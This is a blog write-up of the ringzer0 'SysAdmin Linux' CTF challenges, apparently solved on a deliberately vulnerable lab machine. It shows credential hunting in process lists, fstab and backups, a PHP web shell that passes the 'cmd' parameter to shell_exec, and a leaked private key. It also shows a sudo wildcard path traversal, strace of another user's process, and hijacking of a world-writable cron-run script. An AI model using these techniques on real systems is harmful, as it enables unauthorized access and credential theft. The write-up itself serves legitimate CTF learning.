+++
title = "ringzer0 CTF - SysAdmin Linux"
author = "Victor Dorneanu"
date = "2016-10-30"
tags = ["ringzer0", "ctf", "wargames", "admin", "linux"]
category = "blog"
+++

## SysAdmin Part 1

Let's login to the machine:

```.shell
$ sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh morpheus@for01.ringzer0team.com -p 13375

         _                             ____  __                     
   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
 / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
             /____/                                                 
                                      _ _             ___ _____ ___ 
                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
                            / _ \ ' \| | | ' \/ -_) | (__  | | | _| 
                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
                                                                    

You have mail.
morpheus@forensics:~$ 

```

What's in $HOME:

```.shell
morpheus@forensics:~$ ls  -l
total 4
-rw-r----- 1 root root 1655 Mar 10  2014 egrep
morpheus@forensics:~$ ls -la
total 28
drwxr-xr-x  2 morpheus morpheus 4096 Mar 10  2014 .
drwxr-xr-x 10 root     root     4096 Jun 12  2014 ..
lrwxrwxrwx  1 root     root        9 Mar  9  2014 .bash_history -> /dev/null
-rw-r-----  1 morpheus morpheus  220 Mar  9  2014 .bash_logout
-rwxrwxr-x  1 morpheus morpheus   36 Feb 24 11:16 .bashrc
-rw-r-----  1 root     root     1655 Mar 10  2014 egrep
-rw-r-----  1 morpheus morpheus  675 Mar  9  2014 .profile
-rw-r-----  1 morpheus morpheus   19 Mar  9  2014 .vimrc
```

Nothing interesting. What about running processes?

```.shell
morpheus@forensics:~$ ps -ax
 2615 ?        S      0:00 logger -t mysqld -p daemon.error
 2695 ?        Ss     0:12 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u 105:108
 3110 ?        Ssl    0:00 /usr/sbin/slapd -h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d
 3159 ?        Ss     0:00 /usr/sbin/cron
 3191 ?        Ss     0:05 /usr/sbin/sshd
 3238 ?        Ss     0:12 /usr/sbin/vnstatd -d
 3262 ?        Ss     0:00 /usr/sbin/exim4 -bd -q30m
 3286 ?        S      0:04 /bin/sh /root/backup.sh -u trinity -p Flag-08grILsn3ekqhDK7cKBV6ka8B
 3289 ?        S      0:00 su neo -c /bin/monitor
 3292 ?        Ss     0:00 /bin/monitor
 3319 tty1     Ss+    0:00 /sbin/getty 38400 tty1
 3320 tty2     Ss+    0:00 /sbin/getty 38400 tty2
 3321 tty3     Ss+    0:00 /sbin/getty 38400 tty3
 3322 tty4     Ss+    0:00 /sbin/getty 38400 tty4
 3323 tty5     Ss+    0:00 /sbin/getty 38400 tty5
 3324 tty6     Ss+    0:00 /sbin/getty 38400 tty6
 3651 ?        S      0:04 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u 105:108
 9100 ?        S      0:01 [kworker/0:2]
16157 ?        S      0:00 su neo -c /bin/monitor
16159 ?        Ss     0:00 /bin/monitor
19107 ?        S      0:00 [kworker/0:0]

```

Ah, there we go.


## SysAdmin Part 2

Now let's login with `trinity`:

```.shell
$ sshpass -p Flag-08grILsn3ekqhDK7cKBV6ka8B ssh trinity@for01.ringzer0team.com -p 13375

         _                             ____  __                     
   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
 / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
             /____/                                                 
                                      _ _             ___ _____ ___ 
                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
                            / _ \ ' \| | | ' \/ -_) | (__  | | | _| 
                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
                                                                    

You have mail.

```

Now let's have a look inside `/etc` for files containing **architect**:

```.shell
trinity@forensics:/etc$ grep -r "architect" 2>/dev/null | head -n 10
fstab:#//TheMAtrix/phone  /media/Matrix  cifs  username=architect,password=$(base64 -d "RkxBRy14QXFXMnlKZzd4UERCV3VlVGdqd05jMW5WWQo="),iocharset=utf8,sec=ntlm  0  0
init.d/checkroot.sh:            # fail on older kernels on sparc64/alpha architectures due
aide/aide.conf.d/10_aide_hostname:if [ -n "$(dpkg --print-architecture)" ]; then
aide/aide.conf.d/10_aide_hostname:  echo "@@define ARCH $(dpkg --print-architecture)"
group:architect:x:1006:
passwd:architect:x:1006:1006::/home/architect:/bin/bash
^C
trinity@forensics:/etc$ echo "RkxBRy14QXFXMnlKZzd4UERCV3VlVGdqd05jMW5WWQo=" | base64 -d
FLAG-xAqW2yJg7xPDBWueTgjwNc1nVY

```

Ok, next level.


## SysAdmin Part 3

Let's search for **readable** files and **owned** by the user **architect**:

```.shell
$ architect@forensics:/$ find . -readable -and -user architect 2>/dev/null | head -n 10
./var/mail/architect
./var/www/index.php
./dev/pts/1
./dev/pts/0
./proc/11081
./proc/11081/task
./proc/11081/task/11081
./proc/11081/task/11081/attr
...
```

Hmm, `/var/www/index.php` looks interesting:

```.php
architect@forensics:/$ cat /var/www/index.php  | head -n 20
<?php
if(isset($_GET['cmd'])) {
  $res = shell_exec(urldecode($_GET['cmd']));
  print_r(str_replace("\n", '<br />', $res));
  exit();
}
$info = (object)array();
$info->username = "arch";
$info->password = "asdftgTst5sdf6309sdsdff9lsdftz";
$id = 1003;

function GetList($id, $info) {
        $id = 2;
        $link = mysql_connect("127.0.0.1", $info->username, $info->password);
        mysql_select_db("arch", $link);
        $result = mysql_query("SELECT * FROM arch");
        $output = array();
        while($row = mysql_fetch_assoc($result)) {
                array_push($output, $row);
        }
...
```

Ah, some credentials for a **MySQL** DB. Let's have a look:

```.shell
architect@forensics:~$ mysql -h localhost -u arch -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 66
Server version: 5.5.49-0+deb7u1 (Debian)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| arch               |
+--------------------+
2 rows in set (0.04 sec)

mysql> use arch;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------+
| Tables_in_arch |
+----------------+
| arch           |
| flag           |
+----------------+
2 rows in set (0.00 sec)

mysql> select * from flag;
+---------------------------------+
| flag                            |
+---------------------------------+
| FLAG-0I68UrLA758G5G30806w637a4k |
+---------------------------------+
1 row in set (0.00 sec)
```

## SysAdmin Part 4

I first had a look about all **readable** files (to user **architect**) and searched for `oracle` inside them:

```.shell
architect@forensics:~$ find / -readable -exec grep -i "oracle" {} \; 2>/dev/null
Binary file /backup/c074fa6ec17bb35e168366c43cf4cd19 matches
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoEgxjSM+zh29CqzIet5hxwI4gwWsHL56XlN3xM1zylCog02tZJ5/EA17hvQRoBmh+9lsEaseKnIHpf4WC6BdirAHS56bTq5Mach0cBnIdXogT1/+EsKb72dY4l9S880VsxoiLO/MxWE7oZMbLEnzOH8BJBdgEdLPI7GSaoMsHvMW17IkXuG/qzpbbROamOExC04LSZjCfrhkKxWLZ3Vzu0WLDftw661PUt9lpoBQEjB2m8voEWOqk2THPCbXTl4VMO3hZk0o5n2c6ezXwwcEcU5eTxaADELqCq0TaCvtxMFmxvC+Neu17yhO0BYK/dgdIQIf3U3MTcMpWS0LCvVuN oracle@forensics
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoEgxjSM+zh29CqzIet5hxwI4gwWsHL56XlN3xM1zylCog02tZJ5/EA17hvQRoBmh+9lsEaseKnIHpf4WC6BdirAHS56bTq5Mach0cBnIdXogT1/+EsKb72dY4l9S880VsxoiLO/MxWE7oZMbLEnzOH8BJBdgEdLPI7GSaoMsHvMW17IkXuG/qzpbbROamOExC04LSZjCfrhkKxWLZ3Vzu0WLDftw661PUt9lpoBQEjB2m8voEWOqk2THPCbXTl4VMO3hZk0o5n2c6ezXwwcEcU5eTxaADELqCq0TaCvtxMFmxvC+Neu17yhO0BYK/dgdIQIf3U3MTcMpWS0LCvVuN oracle@forensics
Binary file /var/cache/apt-show-versions/apackages matches
Binary file /var/cache/man/index.db matches
...
```

Inside `/backup/c074fa6ec17bb35e168366c43cf4cd19` we can then find: 

```.shell
[...]
----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqBIMY0jPs4dvQqsyHreYccCOIMFrBy+el5Td8TNc8pQqINNr
WSefxANe4b0EaAZofvZbBGrHipyB6X+FgugXYqwB0uem06uTGnIdHAZyHV6IE9f/
hLCm+9nWOJfUvPNFbMaIizvzMVhO6GTGyxJ8zh/ASQXYBHSzyOxkmqDLB7zFteyJ
F7hv6s6W20TmpjhMQtOC0mYwn64ZCsVi2d1c7tFiw37cOutT1LfZaaAUBIwdpvL6
BFjqpNkxzwm105eFTDt4WZNKOZ9nOns18MHBHFOXk8WgAxC6gqtE2gr7cTBZsbwv
jXrte8oTtAWCv3YHSECH91NzE3DKVktCwr1bjQIDAQABAoIBAQCdefu9c1WZY4bu
MrYNbf0aaE9Dhbcgzo+Me+HQxE2MxSMMCsyEhsn9wSK/5Hkidw6mF3KEmwBIcgiP
nfqdA5YV0BENahw4LITyvIVl4uw9dHuQDEzQKSzswdkkwa6FNHOSThtWSl+9ln6o
5PQXBkWGZN2oDh+vXSGvWz+QWqSho8vufmTtYntfFPAfVfcyp8BtiUgKQh069uGg
XKnehmkrHoW9gQ2Lo0uaFWcTIGm1vsgBd7L4cfb98jDB63H+Lhf4UPYv4WmH2rrj
bnk5lAU71JK4QsPnnOx1PA685p2e5mEfh0LKRKq9Fx3+umbGPJGvgcjobtXaW9OT
mpaz6ZPBAoGBAM+diN8s/osQdi8odS9+HUWVZBa9Z2Dn0X2IlSxWK9u/UclhjYgP
i2KXEY0wRV+ZiXURmrFNVxgA/EJ9BOgptSZNmi9fEdfnVB4L11T7HFny/J8u3sXt
dn0OqHmf5ZEPtV7m0bK0jtznTgTTuBI9yXvRgHO2HQPCshdP7GIgt++lAoGBAM89
Pd7HyMYnh0ancCTICkVIIWF6Ylf20BKz4Zwy9tYASCxY3iFllBdOXw/UgCnmJseQ
73Dcimi5OEyUckOp7xX4HTwidFVbxfNeC0ZfsPbd22qSDcw5orpQMoDy3iP+bPJh
SgwtusqotGjm0jTpnhqRV5x6rchzkMYwF8/WkvfJAoGBAMeem6yh0XiaclfzWYE5
jCGMezjWEeD949IEkhGYJQFbmeK79l49O/KmeAy9veYmdSDntUoGp9f/kozHMgGb
oH5cnQQxL7HczWc6UWd3LhJabIUNhsreAFBL2Ldgg1UPun6uBjACJV7G06AWhWSc
ne58SDp5frpP5/Y8NXdAKDq1AoGAYCSFQ4lj96n29CxRtn6nZSTld5eTcEOsnECf
dhuesAFJemlwBAZgAb/2Eh3/p3CCpSr0KmPmQldLaxujNwjrRkHpLjC9z6vX1ePX
TzqtmpmqZXKEvC4w9EaoZ3JE5GXwnTHNbID6m3JQ4CnVc36+Po0XHB096jTTAV7m
bSGa5SECgYBE2IuW1pk2pOZ+FDtKltWHk8KK89QmGsFf2YnVZ/FsAkPnayeTkmMz
AWxRP/W/Uj5ypw7KjprQee31hkisBG/ZPBvQdjAvxF7m4usuEN2Nkb0FTIjZHYbD
iPOmPHIUlwwL8UVzDQUzXhegSB4GUeP/06T/eM5PPB8SX0ZaHIw1wQ==
-----END RSA PRIVATE KEY-----
[...]
```

... which is most probably a private ssh key. Next I try to login to the machine using the previously find SSH identity:

```.shell
% ssh -i ssh oracle@for01.ringzer0team.com -p 13375

         _                             ____  __                     
   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
 / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
             /____/                                                 
                                      _ _             ___ _____ ___ 
                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
                            / _ \ ' \| | | ' \/ -_) | (__  | | | _| 
                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
                                                                    

You have mail.
```

Bingo! Now let's look around:

```.shell
oracle@forensics:~$ ls -la
total 36
drwxr-x---  3 oracle oracle 4096 Mar 12  2014 .
drwxr-xr-x 10 root   root   4096 Jun 12  2014 ..
-rw-------  1 root   root      0 Mar 12  2014 .bash_history
-rw-r-----  1 oracle oracle  220 Dec 29  2012 .bash_logout
-rw-r-----  1 oracle oracle 3512 Mar 12  2014 .bashrc
-rw-r-----  1 oracle oracle   90 Mar 12  2014 encflag.txt.enc
-rw-r-----  1 oracle oracle   45 Mar 12  2014 flag.txt
-rw-r-----  1 oracle oracle  675 Dec 29  2012 .profile
drwx------  2 oracle oracle 4096 Mar 12  2014 .ssh
-rw-r-----  1 oracle oracle   19 Mar  4  2014 .vimrc
oracle@forensics:~$ cat flag.txt 
RkxBRy1HSUdzMVdxNlY2U3NaOWg0YVFncEdnZGJkUAo=
oracle@forensics:~$ cat flag.txt | base64 -d
FLAG-GIGs1Wq6V6SsZ9h4aQgpGgdbdP
```

## SysAdmin Part 5

SSH into machine:

```.shell
$ ssh -i ssh oracle@for01.ringzer0team.com -p 13375
oracle@forensics:~$ cat .bashrc 
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes
if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
alias reveal="openssl enc -aes-256-cbc -a -d -in encflag.txt.enc -k 'lp6PWgOwDctq5Yx7ntTmBpOISc'"
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    #alias grep='grep --color=auto'
    #alias fgrep='fgrep --color=auto'
    #alias egrep='egrep --color=auto'
fi

# some more ls aliases
#alias ll='ls -l'
#alias la='ls -A'
#alias l='ls -CF'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
```

Do you see sth suspicious? No? Well, I do!

```.shell
alias reveal="openssl enc -aes-256-cbc -a -d -in encflag.txt.enc -k 'lp6PWgOwDctq5Yx7ntTmBpOISc'"
```

Let's decrypt the file:

```.shell
oracle@forensics:~$ reveal
FLAG-IaFOjjFWazycSg0lbVO3T8ZTvz
```

## SysAdmin Part 6

Login as `trinity`:

```.shell
$ sshpass -p Flag-08grILsn3ekqhDK7cKBV6ka8B ssh trinity@for01.ringzer0team.com -p 13375

trinity@forensics:~$ ls -la
total 28
drwxr-xr-x  2 trinity trinity 4096 Mar 10  2014 .
drwxr-xr-x 10 root    root    4096 Jun 12  2014 ..
lrwxrwxrwx  1 root    root       9 Mar  9  2014 .bash_history -> /dev/null
-rwxr--r--  1 trinity trinity  236 Oct 29  2015 .bash_logout
-rwxr--r--  1 trinity trinity 2638 Jul 19 06:37 .bashrc
-rw-r-----  1 neo     neo      124 Sep 20  2015 phonebook
-rwxr--r--  1 trinity trinity  675 Dec 10  2015 .profile
-rwxr-----  1 trinity trinity   23 Jul  5 16:50 .vimrc
```

Obviously only `neo:neo` can read `phonebook`. Now let's check for `sudo`:

```.shell
trinity@forensics:~$ sudo -l
[sudo] password for trinity:
Matching Defaults entries for trinity on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, insults

User trinity may run the following commands on this host:
    (neo) /bin/cat /home/trinity/*
```

Now read the files:

```.shell
trinity@forensics:~$ sudo -u neo /bin/cat /home/trinity/*
The Oracle        1800-133-7133
Persephone        345-555-1244





copy made by Cypher copy utility on /home/neo/phonebook
```

Hmmm, nothing special about it. However, you can use the wildcard to go into the parent directory and 
finally into `/home/neo/`:

```.shell
trinity@forensics:~$ sudo -u neo /bin/cat /home/trinity/../neo/phonebook
The Oracle        1800-133-7133
Persephone        345-555-1244




change my current password FLAG-lRGLKGh2895wIAoOvcBbgk4oL
don't forget to remove this :)
```

Fail :) 


## SysAdmin Part 7

```.shell
% sshpass -p FLAG-lRGLKGh2895wIAoOvcBbgk4oL ssh neo@for01.ringzer0team.com -p 13375

         _                             ____  __                     
   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
 / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
             /____/                                                 
                                      _ _             ___ _____ ___ 
                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
                            / _ \ ' \| | | ' \/ -_) | (__  | | | _| 
                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
                                                                    

You have mail.
neo@forensics:~$ 
```

Let's have a look at running processes:

```.shell
neo@forensics:~$ ps fl -u neo  
F   UID   PID  PPID PRI  NI    VSZ   RSS WCHAN  STAT TTY        TIME COMMAND
4  1003 32505 32503  20   0   3944   256 -      Ss   ?          0:01 /bin/monitor
4  1003 32073 32071  20   0   3944   256 -      Ss   ?          0:01 /bin/monitor
4  1003 31844 31842  20   0   3944   256 -      Ss   ?          0:04 /bin/monitor
4  1003 31624 31622  20   0   3944   256 -      Ss   ?          0:03 /bin/monitor
4  1003 31471 31469  20   0   3944   256 -      Ss   ?          0:02 /bin/monitor
4  1003 31078 31076  20   0   3944   256 -      Ss   ?          0:02 /bin/monitor
4  1003 30040 30038  20   0   3944   256 -      Ss   ?          0:02 /bin/monitor
[...]
```

Since we can read `/bin/monitor` as user `neo` (and `/bin/monitor` was started using 
`sudo neo -c /bin/monitor`) we should be able to **trace** its syscalls (since we are
allowed to attach to a process running as user `neo`):

```.shell
neo@forensics:~$ strace -p32505
Process 32505 attached - interrupt to quit
restart_syscall(<... resuming interrupted call ...>) = 0
write(4294967295, "telnet 127.0.0.1 23\n", 20) = -1 EBADF (Bad file descriptor)
write(4294967295, "user\n", 5)          = -1 EBADF (Bad file descriptor)
write(4294967295, "FLAG-a4UVY5HJQO5ddLc5wtBps48A3\n", 31) = -1 EBADF (Bad file descriptor)
write(4294967295, "get-cpuinfo\n", 12)  = -1 EBADF (Bad file descriptor)
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
rt_sigaction(SIGCHLD, NULL, {SIG_DFL, [], 0}, 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
nanosleep({10, 0},
```

Bingo! The flag is `FLAG-a4UVY5HJQO5ddLc5wtBps48A3`. 


## SysAdmin Part 8

```.shell
% sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh morpheus@for01.ringzer0team.com -p 13375

         _                             ____  __                     
   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
 / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
             /____/                                                 
                                      _ _             ___ _____ ___ 
                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
                            / _ \ ' \| | | ' \/ -_) | (__  | | | _| 
                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
                                                                    

You have mail.
```

I remember some information related to the user `cypher` during the previous challanges. In fact 
I think I've seen sth in the files located at `/backups`:

```.shell
morpheus@forensics:/var/tmp/bk$ cp /backup/* .
morpheus@forensics:/var/tmp/bk$ for i in *; do tar -xf $i; done
morpheus@forensics:/var/tmp/bk$ for i in *; do tar -xf $i; done
morpheus@forensics:/var/tmp/bk$ ls -ltR
.:
total 96
drwxr-xr-x 4 morpheus morpheus  4096 Sep 27 04:46 var
-rwxr-xr-x 1 morpheus morpheus 40960 Sep 27 04:46 3dab3277410dddca016834f91d172027
-rwxr-xr-x 1 morpheus morpheus 10240 Sep 27 04:46 776d27d2a429e63bbc3cb29183417bb2
-rwxr-xr-x 1 morpheus morpheus 20480 Sep 27 04:46 c074fa6ec17bb35e168366c43cf4cd19
-rwxr-xr-x 1 morpheus morpheus 10240 Sep 27 04:46 ca584b15ae397a9ad45b1ff267b55796
drwxr-xr-x 3 morpheus morpheus  4096 Sep 15  2014 home
drwxr-x--x 2 morpheus morpheus  4096 Mar 12  2014 tmp

./var:
total 8
drwxr-xr-x 3 morpheus morpheus 4096 Sep 27 04:46 spool
drwxr-xr-x 2 morpheus morpheus 4096 Sep 27 04:46 log

./var/spool:
total 4
drwxr-xr-x 5 morpheus morpheus 4096 Feb 25  2014 cron

./var/spool/cron:
total 12
drwx--x--- 2 morpheus morpheus 4096 Mar 12  2014 crontabs
drwxr-x--- 2 morpheus morpheus 4096 Feb 25  2014 atjobs
drwxr-x--- 2 morpheus morpheus 4096 Jun  9  2012 atspool

./var/spool/cron/crontabs:
total 4
-rw------- 1 morpheus morpheus 1126 Mar 12  2014 cypher

./var/spool/cron/atjobs:
total 0

./var/spool/cron/atspool:
total 0

./var/log:
total 40
-rw-r----- 1 morpheus morpheus 37172 Mar 12  2014 syslog

./home:
total 4
drwxr-x--- 3 morpheus morpheus 4096 Sep 15  2014 oracle

./home/oracle:
total 0

./tmp:
total 4
-rwxr-xr-x 1 morpheus morpheus 54 Mar 12  2014 Gathering.py
```

As you can see there is user cronjob:

```.shell
morpheus@forensics:/var/tmp/bk$ cat ./var/spool/cron/crontabs/cypher
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.f7mcQy/crontab installed on Wed Mar 12 22:02:27 2014)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
*/3 * * * * python /tmp/Gathering.py
```

So every 3 minutes `python /tmp/Gathering.py` gets executed. If we look closer, we'll 
notice that the Python file is executed as user `cypher`:

```.shell
morpheus@forensics:/var/tmp/bk$ grep -r "cypher" *
Binary file 3dab3277410dddca016834f91d172027 matches
Binary file 776d27d2a429e63bbc3cb29183417bb2 matches
Binary file ca584b15ae397a9ad45b1ff267b55796 matches
tmp/Gathering.py:os.system("ps aux > /home/cypher/info.txt")
var/log/syslog:Mar 12 22:01:58 forensics crontab[1662]: (cypher) BEGIN EDIT (cypher)
var/log/syslog:Mar 12 22:02:27 forensics crontab[1662]: (cypher) REPLACE (cypher)
var/log/syslog:Mar 12 22:02:27 forensics crontab[1662]: (cypher) END EDIT (cypher)
var/log/syslog:Mar 12 22:03:01 forensics /USR/SBIN/CRON[1682]: (cypher) CMD (python /tmp/Gathering.py)
var/log/syslog:Mar 12 22:06:01 forensics /USR/SBIN/CRON[1857]: (cypher) CMD (python /tmp/Gathering.py)
var/log/syslog:Mar 12 22:09:01 forensics /USR/SBIN/CRON[2269]: (cypher) CMD (python /tmp/Gathering.py)
``` 

Finally we want the Python script to read all files under `/home/cypher/*` and redirect the STDOUT
to some file:

```.shell
morpheus@forensics:/var/tmp/bk$ touch /tmp/gather.log
morpheus@forensics:/var/tmp/bk$ chmod 777 /tmp/gather.log
morpheus@forensics:/var/tmp/bk$ cat /tmp/Gathering.py
import os
os.system("cat /home/cypher/*.* > /tmp/gather.log")
```

This should do the trick. Now we'll have to wait for the script to get executed. Every 3 minutes means that
the cronjob will run at following minutes: :00, :03, :06, :09, :12, :15, :18, :21, :24, :27, :30, :33, :36, :39, :42, :45, :48, :51, :54, :57.

Now wait some time till you see:

~~~.shell
morpheus@forensics:/var/tmp$ ls -l /tmp/gather.log
-rwxrwxrwx 1 cypher cypher 8256 Nov 11 06:10 /tmp/gather.log
~~~

Now let's get the content:

~~~.shell
morpheus@forensics:/var/tmp$ cat /tmp/gather.log
python /tmp/Gathering.py &
sleep 5
echo "import os" > /tmp/Gathering.py
echo "os.system('ps aux > /tmp/28JNvE05KBltE8S7o2xu')" >> /tmp/Gathering.py
chmod 777 /tmp/Gathering.py

BASE ?
RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego=
...
~~~

And the flag is:

~~~.shell
$ echo "RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego=" | base64 -d
FLAG-pys3gfczt9pDkEz2io0Pwd8KNz
~~~

Now I can also see why I had troubles executing my python script: `/tmp/Gathering.py` is being executed and then after 5 seconds 
the content of the file gets replaced. 
